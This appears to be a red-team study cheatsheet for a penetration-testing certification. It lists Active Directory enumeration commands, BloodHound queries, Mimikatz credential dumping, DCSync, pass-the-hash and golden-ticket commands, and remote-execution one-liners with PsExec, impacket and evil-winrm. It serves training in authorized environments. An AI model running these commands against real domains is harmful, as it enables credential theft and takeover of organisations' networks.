# Active Directory Commands — Quick Reference

> 02-RedTeam · eCPPT cheatsheets — INE-Cybersecurity-Certifications-Guide (English)

Fast lookup for the commands you will repeat on every Windows/AD engagement and
lab run: legacy `net` commands, the PowerShell ActiveDirectory module,
BloodHound/Cypher one-liners, Mimikatz essentials, and remote-execution
references. **Authorized environments only.**

## Legacy `net` commands

Run from an elevated shell on a domain host. `/domain` targets the DC via
NetBIOS.

```bat
net user                      :: list local users
net user /domain              :: list DOMAIN users
net user jsmith /domain       :: details for one domain user (groups, last logon)
net user jsmith P@ssw0rd /domain   :: reset a password (needs permission)
net group "Domain Admins" /domain   :: members of a domain group
net group "Domain Admins" bob /add /domain   :: add member
net localgroup Administrators :: local admin group on THIS host
net localgroup Administrators CORP\bob /add   :: add a domain user locally
net view \\SRV01              :: list shares on a remote host
net view /domain              :: list domains/workgroups visible
net use \\SRV01\share         :: mount a share
net use \\SRV01\IPC$ /user:CORP\bob P@ssw0rd  :: authenticated IPC connection
net session                   :: active sessions to this host (needs admin)
net accounts /domain          :: domain password/lockout policy
net share                     :: local shares
```

`nltest /dclist:corp.local` and `nltest /dsgetdc:corp.local` are the quick
"which DC am I using" checks.

## PowerShell ActiveDirectory module

Requires the RSAT AD tools (`Get-WindowsCapability`/`Install-WindowsFeature
RSAT-AD-PowerShell`) — installed on DCs by default.

```powershell
Import-Module ActiveDirectory

# Users / groups / computers / OUs
Get-ADUser -Identity jsmith -Properties *            # all attributes of one user
Get-ADUser -Filter * -SearchBase "OU=Employees,DC=corp,DC=local" | Select name, enabled
Get-ADUser -Filter * -Properties servicePrincipalName | Where-Object servicePrincipalName   # SPN users -> Kerberoast targets
Get-ADGroup -Filter "Name -like '*Admin*'"
Get-ADComputer -Filter * -Properties OperatingSystem | Select Name, OperatingSystem
Get-ADOrganizationalUnit -Filter *

# Membership and domain info
Get-ADPrincipalGroupMembership -Identity jsmith | Select Name   # groups of a user
Get-ADGroupMember -Identity "Domain Admins" | Select Name
Get-ADDomain | Select DNSRoot, DomainSID, PDCEmulator       # DOMAIN SID lives here
Get-ADDomainController -Filter * | Select HostName, Site
Get-ADDefaultDomainPasswordPolicy

# LDAP-style filters
Get-ADUser -LDAPFilter "(adminCount=1)"                     # privileged users
Get-ADUser -LDAPFilter "(servicePrincipalName=*)" -Properties servicePrincipalName

# Changes
Set-ADAccountPassword -Identity jsmith -NewPassword (ConvertTo-SecureString "N3w!" -AsPlainText -Force) -Reset
Add-ADGroupMember -Identity "WebAdmins" -Members svc_sql
New-ADUser -Name "Sam" -SamAccountName sam -Path "OU=...,DC=corp,DC=local" -Enabled $true
New-ADOrganizationalUnit -Name "NewOU" -Path "DC=corp,DC=local"
```

ActiveDirectory cmdlets work from your *current* context — pass
`-Credential (Get-Credential)` when testing as another user.

## BloodHound / Cypher one-liners

Collectors: SharpHound on Windows, `bloodhound-python` from Kali (see
[bloodhound-guide.md](../tools/bloodhound-guide.md)).

```bash
# Linux collection with a low-priv domain account
bloodhound-python -u bob -p 'Autumn2024!' -d corp.local -ns 10.0.0.10 -c All
```

```cypher
// Domain Admins members
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-512' RETURN u.name

// Kerberoastable users
MATCH (u:User) WHERE u.hasspn = true AND u.enabled = true RETURN u.name, u.serviceprincipalnames

// Live sessions
MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.enabled = true RETURN c.name, u.name

// High-value targets
MATCH (n) WHERE n.highvalue = true RETURN n.name, labels(n)

// Shortest path USER -> Domain Admins
MATCH p = shortestPath((u:User)-[*1..]->(g:Group))
WHERE u.name =~ '(?i)JDOE@.*' AND g.objectid ENDS WITH '-512' RETURN p
```

## Mimikatz essentials

```bat
:: one-shot style: mimikatz.exe "cmd1" "cmd2" exit
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
mimikatz.exe "privilege::debug" "lsadump::sam" exit
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:bob /domain:corp.local /ntlm:HASH /run:powershell.exe" exit
mimikatz.exe "kerberos::golden /user:da /domain:corp.local /sid:S-1-5-21-X-Y-Z /krbtgt:HASH /ptt" exit
mimikatz.exe "kerberos::ptt C:\path\ticket.kirbi" exit
```

Lab-only; see [mimikatz-reference.md](../tools/mimikatz-reference.md).

## Remote execution references

| Technique | Tool/command | Port(s) | Notes |
|---|---|---|---|
| SMB service control | Sysinternals `PsExec64.exe -accepteula \\SRV01 -u CORP\bob -p P@ss cmd.exe` | 445 | needs admin on target |
| SMB (impacket) | `impacket-psexec 'corp.local/bob:P@ss@10.0.0.11'` | 445 | also `-hashes :NTLM` |
| SMB (impacket) | `impacket-smbexec 'corp.local/bob@10.0.0.11' -hashes :NTLM` | 445 | no temp binary |
| WMI (impacket) | `impacket-wmiexec 'corp.local/bob:P@ss@10.0.0.11'` | 135 + 445 | semi-interactive; writes output via `ADMIN$`, so it still needs admin |
| WMI (legacy) | `wmic /node:SRV01 /user:CORP\bob /password:P@ss process call create "cmd.exe /c whoami > C:\o.txt"` | 135 | output is not returned; read the file |
| WinRM | `evil-winrm -i 10.0.0.11 -u bob -p P@ss` / `-H HASH` | 5985/5986 | PowerShell remoting protocol |
| WinRM | `Enter-PSSession -ComputerName SRV01 -Credential (Get-Credential)` | 5985/5986 | interactive |
| WinRM | `Invoke-Command -ComputerName SRV01,SRV02 -ScriptBlock { whoami }` | 5985/5986 | one-shot, returns objects |
| RDP | `xfreerdp /v:10.0.0.11 /u:bob /p:P@ss /dynamic-resolution` | 3389 | interactive GUI |

Hash-based variants: replace the password with `-hashes :<NTLM>` (impacket) or
`-H <NTLM>` (evil-winrm/nxc). Validating first:

```bash
nxc smb 10.0.0.11 -u bob -p 'P@ss'            # valid creds?
nxc smb 10.0.0.11 -u bob -H '<NTLM>'          # valid hash? (Pwn3d! = admin)
```

## Common Mistakes & Tips

- `/domain` vs local — `net localgroup` is THIS host; `net group /domain` is
  the domain. Mixing them up produces confusing "no such group" errors.
- RSAT missing — AD cmdlets fail with "module not found"; install
  `RSAT-AD-PowerShell` or run from the DC.
- **Attribute names are case-insensitive; matching rules are where case matters.** LDAP
  attribute *descriptions* are case-insensitive (RFC 4512 §2.5), so `sAMAccountName` and
  `samaccountname` name the same attribute, and RFC 4515 filters match attribute names the
  same way. What differs is the *value* comparison: `caseIgnoreMatch` (most name and
  description attributes) folds case, while `caseExactMatch` and the DN syntaxes do not — so
  `(cn=JDOE)` is not a reliable way to find `jdoe`. Separately, PowerShell's `-Filter`
  parameter is **not** LDAP: it takes PowerShell syntax (`"Name -like '*x*'"`), and
  `-LDAPFilter` is the one that takes an RFC 4515 filter.
- BloodHound queries need the *imported* data — a fresh collector zip only
  helps after ingestion.
- Mimikatz/PtH needs admin on the *target*, not just valid credentials.
- Always check current user first: `whoami /all` — privileges and group
  membership drive the next command choice.
- Log your commands: you will need exact evidence when writing the report.

## Checklist / Self-Test

- [ ] I can list domain users, a user's groups, and Domain Admin members with both `net` and AD cmdlets
- [ ] I can find SPN users (Kerberoast targets) with the AD module from memory
- [ ] I can write a Cypher shortest-path-to-DA query without looking it up
- [ ] I can run the Mimikatz one-shot style and know which module does what
- [ ] I can execute commands on a remote host via PsExec, WinRM, and WMI
- [ ] I can validate credentials/hashes with `nxc` before attempting access
- [ ] I can identify the ports each remote-execution channel uses

> **Verification:** the wmiexec output path was checked against upstream `examples/wmiexec.py` (output written to `\\127.0.0.1\<share>`, default share `ADMIN$`, read back over SMB) and the Impacket hash format against `examples/psexec.py` on 2026-09-19. Corrections applied from the 19 Sep 2026 audit.

## Further Resources

- [Microsoft Learn — Active Directory module cmdlets](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)
- [Microsoft Learn — Active Directory Domain Services overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)
- [Sysinternals PsExec — Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [Impacket — official repository](https://github.com/fortra/impacket)
- [NetExec — official repository](https://github.com/Pennyw0rth/NetExec)
- [HackTricks — Active Directory methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology.html)
